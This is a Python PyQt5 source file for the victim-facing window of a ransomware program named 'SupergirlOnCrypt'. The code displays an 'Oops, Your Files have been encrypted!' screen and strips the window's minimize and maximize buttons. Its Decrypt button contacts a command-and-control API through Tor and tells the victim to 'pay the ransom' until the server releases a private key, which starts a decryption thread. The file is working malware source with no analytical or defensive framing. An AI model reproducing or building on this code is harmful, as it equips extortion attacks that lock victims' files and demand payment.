from PyQt5 import QtCore
from PyQt5.QtCore import QSize
from PyQt5.QtGui import QImage, QPalette, QBrush, QFont
from PyQt5.QtWidgets import QLabel, QPushButton, QWidget, QMessageBox, QTextEdit, QProgressBar
from Helper import Helper
from TorManager import TorManager
import Config
import json
import base64
import DecryptThread


class GUI(QWidget):
    def __init__(self, uuid):
        self.uuid = uuid
        QWidget.__init__(self)
        self.headerFont = QFont("Times", 22, QFont.AllUppercase)
        self.setup()

    def setup(self):
        self.resize(800, 600)
        self.setWindowTitle("SupergirlOnCrypt")
        self.setWindowFlags(self.windowFlags() | QtCore.Qt.CustomizeWindowHint)
        self.setWindowFlags(self.windowFlags() & ~QtCore.Qt.WindowMaximizeButtonHint)
        self.setWindowFlags(self.windowFlags() & ~QtCore.Qt.WindowMinimizeButtonHint)
        self.setbg()
        self.placeWidgets()
        self.show()

    def setbg(self):
        h = Helper()
        oImage = QImage(h.path("res/gui_bg.jpg"))
        sImage = oImage.scaled(QSize(800, 600))  # resize Image to widgets size
        palette = QPalette()
        palette.setBrush(10, QBrush(sImage))  # 10 = Windowrole
        self.setPalette(palette)

    def placeWidgets(self):
        #heading
        self.lbHeader = QLabel("Oops, Your Files\nhave been encrypted!", self)
        self.lbHeader.setFont(self.headerFont)
        self.lbHeader.setStyleSheet("QLabel { color: white;}")
        self.lbHeader.setGeometry(10, 15, 500, 120)

        self.infoText = QTextEdit(self)
        self.infoText.setReadOnly(True)
        self.infoText.setGeometry(205, 150, 550, 360)
        h = Helper()
        with open(h.path('res/info.html'), 'r') as encrypt_info_file:
            encrypt_text = encrypt_info_file.read().replace('\n', '')
        self.infoText.setHtml(encrypt_text)

        self.progressBar = QProgressBar(self)
        self.progressBar.setRange(0, 0)
        self.progressBar.setGeometry(20, 550, 500, 24)
        self.progressBar.hide()

        #button decrypt
        self.btnDecrypt = QPushButton("Decrypt", self)
        self.btnDecrypt.move(650, 550)
        self.btnDecrypt.setStyleSheet("QPushButton {background-color:black; color: white; width:100px; height:24px;} "
                                      "QPushButton:hover {color:green;}")
        self.btnDecrypt.clicked.connect(self.decryptData)

    def decryptData(self):
        self.progressBar.show()
        tor = TorManager()
        r = tor.getSession()
        req = r.get(Config.API_URL + "/decrypt/" + self.uuid)
        data = json.loads(req.text)
        if data['STATUS'] == "FAIL":
            QMessageBox.question(self, "Still locked...", "Your machine is still locked\nPlease pay the ransom", QMessageBox.Ok)
        elif data['STATUS'] == "SUCCESS":
            privkey = base64.b64decode(data['priv_key']).decode('utf-8')

            self.decryptThread = DecryptThread.DecryptThread(privkey)
            self.decryptThread.start()
